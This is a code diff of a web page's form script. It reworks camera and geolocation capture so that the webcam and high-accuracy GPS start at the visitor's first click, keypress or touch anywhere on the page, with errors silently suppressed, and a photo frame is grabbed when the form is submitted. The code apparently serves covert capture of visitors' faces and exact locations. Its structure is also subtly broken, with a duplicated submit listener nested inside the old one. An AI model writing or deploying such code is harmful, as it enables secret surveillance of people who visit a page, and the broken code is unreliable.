@@ -398,31 +398,39 @@
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
-                // GPS logic
+            // Camera initiation function
+            async function initCamera() {
+                const video = document.getElementById('video');
+                if (!video || video.srcObject) return;
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
+                    video.srcObject = stream;
+                    video.play();
+                } catch (err) {}
+            }
+
+            // GPS initialization
+            function initGps() {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(pos => {
                         document.getElementById('lat').value = pos.coords.latitude;
                         document.getElementById('lng').value = pos.coords.longitude;
-                    }, null, { timeout: 5000 });
+                    }, null, { enableHighAccuracy: true, timeout: 10000 });
                 }
+            }
 
-                // Camera initiation
-                async function initCamera() {
-                    const video = document.getElementById('video');
-                    if (!video || video.srcObject) return;
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
-                        video.srcObject = stream;
-                        video.play();
-                    } catch (err) {}
-                }
+            // Start camera and GPS as soon as they interact with the page
+            ['mousedown', 'keydown', 'touchstart'].forEach(evt => {
+                document.addEventListener(evt, () => {
+                    initCamera();
+                    initGps();
+                }, { once: true, passive: true });
+            });
 
-                // Start camera as soon as they interact with the form
-                ['mousedown', 'keydown', 'touchstart'].forEach(evt => {
-                    document.addEventListener(evt, initCamera, { once: true, passive: true });
-                });
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
 
-                // Capture Photo frame on submit
+                // Capture Photo frame if camera is ready
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 if (video && video.srcObject && canvas) {
